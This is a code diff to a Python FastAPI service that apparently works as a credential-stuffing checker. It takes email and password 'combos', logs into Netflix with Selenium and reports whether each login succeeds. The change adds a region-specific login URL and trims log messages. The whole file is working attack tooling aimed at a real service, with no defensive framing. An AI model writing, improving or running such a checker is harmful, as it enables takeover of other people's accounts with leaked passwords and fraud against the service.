@@ -2,6 +2,7 @@
 import os
 import time
 import requests
+from typing import Optional
 
 from fastapi import FastAPI, HTTPException, Header
 from pydantic import BaseModel
@@ -39,19 +40,17 @@ def load_location():
         resp = requests.get(candidate, timeout=5)
         if 'name="userLoginId"' in resp.text:
             LOGIN_URL = candidate
-        else:
-            LOGIN_URL = "https://www.netflix.com/login"
     except Exception as e:
         print(f"[startup] URL check failed: {e!r}")
-        LOGIN_URL = "https://www.netflix.com/login"
 
     print(f"[startup] Public IP: {PUBLIC_IP}, Country: {GEO_COUNTRY} ({GEO_CODE})")
-    print(f"[startup] Using LOGIN_URL = {LOGIN_URL}")
+    print(f"[startup] Default LOGIN_URL = {LOGIN_URL}")
 
 
 class Combo(BaseModel):
     email: str
     password: str
+    region: Optional[str] = None   # e.g. "PH", "US", etc.
 
 
 def make_driver():
@@ -68,7 +67,6 @@ def make_driver():
         "Chrome/114.0.5735.199 Safari/537.36"
     )
     driver = webdriver.Chrome(options=opts)
-    # 3) Enforce a max page load time
     driver.set_page_load_timeout(30)
     return driver
 
@@ -82,33 +80,47 @@ def check_combo(
         raise HTTPException(401, "Invalid API key")
 
     print(f"[check] Start for {combo.email}")
+
+    # Determine which login URL to use:
+    login_url = LOGIN_URL
+    if combo.region:
+        region_code = combo.region.upper()
+        candidate = f"https://www.netflix.com/{region_code.lower()}-en/login"
+        try:
+            r = requests.get(candidate, timeout=3)
+            if 'name="userLoginId"' in r.text:
+                login_url = candidate
+        except Exception:
+            pass
+
+    print(f"[check] Using LOGIN_URL = {login_url}")
     driver = make_driver()
     wait   = WebDriverWait(driver, 15)
 
     try:
         # 1) Navigate
-        print(f"[check] GET {LOGIN_URL}")
+        print(f"[check] GET {login_url}")
         try:
-            driver.get(LOGIN_URL)
+            driver.get(login_url)
         except TimeoutException:
             print("[check] Page load timeout")
             raise HTTPException(504, "Netflix page load timeout")
 
         # 2) Wait for login field
-        print("[check] Waiting for userLoginId field")
+        print("[check] Waiting for userLoginId")
         wait.until(EC.presence_of_element_located((By.NAME, "userLoginId")))
 
         # 3) Dismiss cookie banner
         try:
-            print("[check] Trying to dismiss cookies banner")
+            print("[check] Dismiss cookie banner")
             btn = driver.find_element(By.ID, "onetrust-reject-all-handler")
             btn.click(); time.sleep(0.5)
         except NoSuchElementException:
-            print("[check] No cookies banner")
+            print("[check] No cookie banner")
 
-        # 4) Toggle PIN screen if needed
+        # 4) Toggle PIN-first screen
         try:
-            print("[check] Checking for PIN-first toggle")
+            print("[check] Check PIN toggle")
             toggle = driver.find_element(
                 By.CSS_SELECTOR, "button[data-uia='login-toggle-button']"
             )
@@ -116,7 +128,7 @@ def check_combo(
                 toggle.click(); time.sleep(0.5)
                 print("[check] Toggled to password mode")
         except NoSuchElementException:
-            print("[check] No PIN screen")
+            print("[check] No PIN-first screen")
 
         # 5) Fill & submit
         print("[check] Filling credentials")
@@ -125,7 +137,7 @@ def check_combo(
         email_el.clear(); email_el.send_keys(combo.email)
         pwd_el.clear();   pwd_el.send_keys(combo.password)
         print("[check] Submitting form")
-        pwd_el.send_keys(u"\ue007")  # ENTER
+        pwd_el.send_keys(u"\ue007")
 
         # 6) Wait for success or timeout
         print("[check] Waiting for browse or profile gate")
@@ -135,17 +147,17 @@ def check_combo(
                 or "profiles-gate-container" in d.page_source
             )
             success = True
-            print("[check] Login success detected")
+            print("[check] Login success")
         except TimeoutException:
             success = False
-            print("[check] Login timeout/failure")
+            print("[check] Login failed or timed out")
 
         return {
             "ok": success,
             "server_ip": PUBLIC_IP,
             "server_country": GEO_COUNTRY,
             "server_code": GEO_CODE,
-            "login_url": LOGIN_URL,
+            "login_url": login_url,
         }
 
     finally:
